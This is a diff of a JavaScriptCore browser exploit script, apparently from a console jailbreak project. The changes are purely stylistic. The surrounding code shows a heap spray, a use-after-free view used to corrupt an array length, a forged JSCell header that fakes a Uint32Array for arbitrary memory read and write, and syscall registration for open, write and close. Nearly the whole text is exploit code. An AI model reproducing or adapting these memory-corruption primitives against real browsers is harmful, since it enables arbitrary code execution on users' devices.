@@ -29,14 +29,14 @@ log('Spraying arrays with marker...')
 // spray candidates arrays to be used as leak primitive
 var spray = new Array(0x1000)
 for (var i = 0; i < spray.length; i++) {
-    spray[i] = new Array(spray_size).fill(0x13371337)
+  spray[i] = new Array(spray_size).fill(0x13371337)
 }
 
 log('Looking for marked array...')
-// find sprayed candidate by marker then corrupt its length 
-for (var i = 8; i < uaf_view.byteLength; i += 16) { 
-  if (uaf_view.getBigInt(i - 8, true).eq(indexing_header)
-    && uaf_view.getBigInt(i, true).eq(marker)) {
+// find sprayed candidate by marker then corrupt its length
+for (var i = 8; i < uaf_view.byteLength; i += 16) {
+  if (uaf_view.getBigInt(i - 8, true).eq(indexing_header) &&
+    uaf_view.getBigInt(i, true).eq(marker)) {
     log(`Found marker at uaf_view[${i}] !!`)
 
     marked_arr_offset = i - 8
@@ -100,10 +100,10 @@ var rw_obj = { js_cell: js_cell.d(), butterfly: null, vector: slave, length_and_
 var structure_id = 0x80
 while (!(master instanceof Uint32Array)) {
   js_cell = new BigInt(
-      0x00 // IndexingType::NonArray
-    | 0x23 << 8 // JSType::Uint32ArrayType
-    | 0xE0 << 16 // TypeInfo::InlineTypeFlags::OverridesGetOwnPropertySlot | TypeInfo::InlineTypeFlags::InterceptsGetOwnPropertySlotByIndexEvenWhenLengthIsNotZero | TypeInfo::InlineTypeFlags::StructureIsImmortal
-    | 0x01 << 24, // CellType::DefinitelyWhite
+    0x00 | // IndexingType::NonArray
+    0x23 << 8 | // JSType::Uint32ArrayType
+    0xE0 << 16 | // TypeInfo::InlineTypeFlags::OverridesGetOwnPropertySlot | TypeInfo::InlineTypeFlags::InterceptsGetOwnPropertySlotByIndexEvenWhenLengthIsNotZero | TypeInfo::InlineTypeFlags::StructureIsImmortal
+    0x01 << 24, // CellType::DefinitelyWhite
     structure_id++ // StructureID
   )
 
@@ -195,4 +195,4 @@ fn.register(0x4, 'write', 'bigint')
 fn.register(0x5, 'open', 'bigint')
 fn.register(0x6, 'close', 'bigint')
 
-//utils.notify('UwU')
+// utils.notify('UwU')
